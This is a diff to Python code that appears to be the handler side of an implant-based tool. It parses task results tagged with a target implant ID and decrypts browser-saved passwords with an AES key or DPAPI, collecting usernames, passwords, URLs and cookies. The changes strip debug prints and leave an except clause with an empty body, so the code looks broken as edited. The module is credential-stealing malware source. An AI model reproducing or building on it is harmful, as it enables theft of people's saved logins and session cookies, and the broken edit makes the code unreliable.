@@ -44,7 +44,6 @@ def decrypt_data_dpapi(encrypted_bytes):
 """
 def decrypt_password(encrypted_password, key):
     try:
-        print("Trying to decrypt password")
         #print(encrypted_password)
         #print(key)
         key = bytes.fromhex(key)
@@ -68,16 +67,10 @@ def decrypt_password(encrypted_password, key):
         print(Exception, e,)
         # if the above fails, it is possible that your browsert is OLD
         # in that case, you can just directly call the DPAPI
-        try:
-            print("yahoo")
-            #return str(decrypt_data_dpapi(ciphertext))
-        except:
-            # not supported
-            return ""
+       
 
 
 def newParseJSON(json_res):
-    print("Starting new Parse JSON")
 
     response_data = json_res.get('response_data')
 
@@ -88,7 +81,6 @@ def newParseJSON(json_res):
     target_implant_id = json_res.get('target_implant_id')
     task_id = json_res['task_id']
 
-    print("After getting dictionary keys")
     username_list = []
     password_list = []
     url_list = []
@@ -97,7 +89,6 @@ def newParseJSON(json_res):
     prof_pw_list = []
     prof_cook_list = []
 
-    print("Succesfully instatiated variables")
     for user in passwords:
         for entry in passwords[user]:
             password_list.append(decrypt_password(entry['password'], key))
